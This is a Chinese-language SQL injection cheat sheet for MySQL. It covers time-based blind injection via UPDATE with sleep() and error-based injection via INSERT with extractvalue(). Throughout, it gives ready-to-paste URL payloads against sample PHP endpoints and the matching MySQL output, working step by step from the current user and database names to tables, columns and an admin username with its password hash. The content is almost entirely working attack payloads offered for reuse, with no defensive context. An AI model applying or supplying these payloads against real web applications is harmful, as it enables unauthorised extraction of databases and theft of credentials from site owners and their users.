# MySQL update 延时盲注

## 0x00 记忆方式

if(substring(表达式,1,1)=判断条件 ,sleep(5),1)

## 0x01 基本数据

```plain
mysql> select version();
+-----------+
| version() |
+-----------+
| 5.5.53    |
+-----------+
1 row in set (0.27 sec)
mysql> select user();
+----------------+
| user()         |
+----------------+
| root@localhost |
+----------------+
1 row in set (0.00 sec)
mysql> select database();
+------------+
| database() |
+------------+
| test       |
+------------+
1 row in set (0.00 sec)
```

## 0x02 获取数据长度

```plain
# 读取长度
mysql> select length(user());
+----------------+
| length(user()) |
+----------------+
|             14 |
+----------------+
1 row in set (0.00 sec)
```

web语句: http://www.test.com/sql_save.php?data=if(length(user())=14,sleep(5),1)

数据库语句: UPDATE test SET content=if(length(user())=14,sleep(5),1) WHERE id=1;

## 0x03 读取数据库版本/当前连接用户/当前连接的数据库

读取不同的内容

例如:

substring(user(),1,1) = r

substring(user(),2,1) = o



web语句: http://www.test.com/sql_save.php?data=if(substring(user(),1,1)='r',sleep(5),1)
数据库语句: UPDATE test SET content=if(substring(user(),1,1)='r',sleep(5),1) WHERE id=1;

## 0x04 猜库名

注意: LIMIT 0 修改会显示其他库名

例如:

LIMIT 0,1 修改为0 就是出1库

LIMIT 1,1 修改为1 就是出2库

```plain
// 演示数据
mysql> SELECT schema_name FROM information_schema.schemata LIMIT 0,1;
+--------------------+
| schema_name        |
+--------------------+
| information_schema |
+--------------------+
1 row in set (0.00 sec)
```

web语句: http://www.test.com/sql_save.php?data=if(substring((SELECT schema_name FROM information_schema.schemata LIMIT 0,1),1,1)='i',sleep(5),1)



读取1库库名第一个字: UPDATE test SET content=if(substring((SELECT schema_name FROM information_schema.schemata LIMIT 0,1),1,1)='i',sleep(5),1) WHERE id=1;



读取1库库名第二个字: UPDATE test SET content=if(substring((SELECT schema_name FROM information_schema.schemata LIMIT 0,1),2,1)='n',sleep(5),1) WHERE id=1;

## 0x05 猜表名

注意: table_schema=xxx 修改为其他库会爆出其他库的数据

例如:

table_schema=database()  会获取当前连接的库数据

table_schema='test' 会获取test库数据



注意: LIMIT 0 修改会爆出不同的表名

例如:

LIMIT 0,1 修改为0 就是出1表

LIMIT 1,1 修改为1 就是出2表

```plain
// 演示数据
mysql> SELECT table_name FROM information_schema.tables where table_schema=database() LIMIT 0,1;
+------------+
| table_name |
+------------+
| tdb_admin  |
+------------+
1 row in set (0.00 sec)
```

web语句: http://www.test.com/sql_save.php?data=if(substring((SELECT table_name FROM information_schema.tables where table_schema=database() LIMIT 0,1),1,1)='t',sleep(5),1)



数据库语句-读取当前库的第一张表名的第一个字: UPDATE test SET content=if(substring((SELECT table_name FROM information_schema.tables where table_schema=database() LIMIT 0,1),1,1)='t',sleep(5),1) WHERE id=1;



数据库语句-读取当前库的第一张表名的第二个字: UPDATE test SET content=if(substring((SELECT table_name FROM information_schema.tables where table_schema=database() LIMIT 0,1),2,1)='d',sleep(5),1) WHERE id=1;

## 0x06 猜字段

table_schema = "xx" 要爆的数据库名

table_name = "xx" 要爆的表名



注意: limit 0 表示要爆的位置

例如:

表tdb_admin的字段为 id,usernam,password

limit 0,1 = id

limit 1,1 = username

limit 2,1 = password

```plain
// 演示数据
mysql> SELECT column_name FROM information_schema.columns where table_schema='test' and table_name='tdb_admin' limit 0,1;
+-------------+
| column_name |
+-------------+
| id          |
+-------------+
1 row in set (0.00 sec)
```

web语句: http://www.test.com/sql_save.php?data=if(substring((SELECT column_name FROM information_schema.columns where table_schema='test' and table_name='tdb_admin' limit 0,1),1,1)='i',sleep(5),1)



猜test库 tdb_admin表的第一个字段名第一个字: UPDATE test SET content=if(substring((SELECT column_name FROM information_schema.columns where table_schema='test' and table_name='tdb_admin' limit 0,1),1,1)='i',sleep(5),1) WHERE id=1;



猜test库 tdb_admin表的第一个字段名第二个字: UPDATE test SET content=if(substring((SELECT column_name FROM information_schema.columns where table_schema='test' and table_name='tdb_admin' limit 0,1),2,1)='d',sleep(5),1) WHERE id=1;

## 0x07 爆内容

注意: limit 0 表示要显示那一条数据

limit 0,1 表示第一条

limit 1,1 表示第二条

```plain
mysql> SELECT username FROM test.tdb_admin limit 0,1;
+----------+
| username |
+----------+
| admin    |
+----------+
1 row in set (0.00 sec)
```

web语句: http://www.test.com/sql_save.php?data=if(substring((SELECT username FROM test.tdb_admin limit 0,1),1,1)='a',sleep(5),1)

读取某库某表某字段第一个字: UPDATE test SET content=if(substring((SELECT 字段名 FROM 库名.表名 limit 0,1),1,1)='a',sleep(5),1) WHERE id=1

读取某库某表某字段第二个字: UPDATE test SET content=if(substring((SELECT 字段名 FROM 库名.表名 limit 0,1),2,1)='a',sleep(5),1) WHERE id=1

# MySQL insert 爆错注入

## 0x00 概要

报错注入主要用于在页面中没有显示位，但是使用了echo mysql_error();输出了错误信息时使用。

记忆方式: extractvalue(1,(concat(0x7e,(payload),0x7e)))

## 0x01 爆数据库版本/连接用户/连接的数据库

web语句: http://www.test.com/sql_add.php?data=(extractvalue(1,concat(0x7e,(select user()),0x7e)))

数据库语句: INSERT INTO test (test) value ((extractvalue(1,concat(0x7e,(select user()),0x7e))));

```plain
mysql> INSERT INTO test (test) value ((extractvalue(1,concat(0x7e,(select user()),0x7e))));
ERROR 1105 (HY000): XPATH syntax error: '~root@localhost~'
```

## 0x02 爆库名

注意: LIMIT 0 修改会显示其他库名

例如:

LIMIT 0,1 修改为0 就是出1库

LIMIT 1,1 修改为1 就是出2库

web语句: http://www.test.com/sql_add.php?data=extractvalue(1, concat(0x7e,(SELECT distinct concat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 0,1)))

数据库语句: INSERT INTO test (test) value (extractvalue(1, concat(0x7e,(SELECT distinct concat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 0,1))));

```plain
mysql> INSERT INTO test (test) value (extractvalue(1, concat(0x7e,(SELECT distinct concat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 0,1))));
ERROR 1105 (HY000): XPATH syntax error: '~~information_schema~'
```

## 0x03 爆表名

注意: table_schema=xxx 修改为其他库会爆出其他库的数据

例如:

table_schema=database()  会获取当前连接的库数据

table_schema='test' 会获取test库数据



注意: LIMIT 0 修改会爆出不同的表名

例如:

LIMIT 0,1 修改为0 就是出1表

LIMIT 1,1 修改为1 就是出2表

web语句: http://www.test.com/sql_add.php?data=extractvalue(1, concat(0x7e,(SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 0,1)))

数据库语句: INSERT INTO test (test) value (extractvalue(1, concat(0x7e,(SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 0,1))));

```plain
mysql> INSERT INTO test (test) value (extractvalue(1, concat(0x7e,(SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 0,1))));
ERROR 1105 (HY000): XPATH syntax error: '~~tdb_admin~'
```

## 0x04 暴字段

table_schema = "xx" 要爆的数据库名

table_name = "xx" 要爆的表名

limit 0 表示要爆的位置

例如:

表tdb_admin的字段为 id,usernam,password

limit 0 = id

limit 1 = username

limit 2 = password

web语句: http://www.test.com/sql_add.php?data=extractvalue(1, concat(0x7e,(SELECT distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_schema='test' and table_name='tdb_admin' limit 0,1)))

数据库语句-爆test库 tdb_admin表的字段名: INSERT INTO test (test) value (extractvalue(1, concat(0x7e,(SELECT distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_schema='test' and table_name='tdb_admin' limit 0,1))));

```plain
mysql> INSERT INTO test (test) value (extractvalue(1, concat(0x7e,(SELECT distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_schema='test' and table_name='tdb_admin' limit 0,1))));
ERROR 1105 (HY000): XPATH syntax error: '~~id~'
```

## 0x05 爆内容

注意: limit 0 表示要显示那一条数据

limit 0 表示第一条

limit 1 表示第二条

web语句: http://www.test.com/sql_add.php?data=extractvalue(1, concat(0x7e,(SELECT distinct concat(0x7e,字段名,0x3a,字段名,0x3a,字段名,0x7e) FROM 库名.表名 limit 0,1)))

数据库语句: INSERT INTO test (test) value (extractvalue(1, concat(0x7e,(SELECT distinct concat(0x7e,字段名,0x3a,字段名,0x3a,字段名,0x7e) FROM 库名.表名 limit 0,1))))

```plain
mysql> INSERT INTO test (test) value (extractvalue(1, concat(0x7e,(SELECT distinct concat(0x7e,id,0x3a,username,0x3a,password,0x7e) FROM test.tdb_admin limit 0,1))));
ERROR 1105 (HY000): XPATH syntax error: '~~1:admin:7fef6171469e80d32c0559'
```